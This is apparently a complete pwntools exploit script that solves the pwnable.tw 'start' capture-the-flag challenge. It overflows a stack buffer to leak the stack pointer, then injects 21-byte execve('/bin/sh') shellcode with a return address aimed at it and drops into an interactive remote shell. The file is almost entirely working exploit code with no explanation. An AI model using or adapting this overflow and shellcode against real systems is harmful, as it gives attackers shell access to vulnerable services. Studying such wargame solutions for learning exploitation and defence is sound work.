from pwn import *

# p = process('./start1')
# context.log_level = 'debug'
p = remote('chall.pwnable.tw', 10000)
# gdb.attach(p)
# fill stack1
payload = 'a'*20
payload += p32(0x804808B)


p.sendafter('CTF:', payload)

esp_addr = u32(p.recv()[24:28])


shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# 21bytes
payload = shellcode + 'a'*23 + p32(esp_addr-28)
p.send(payload)
p.interactive()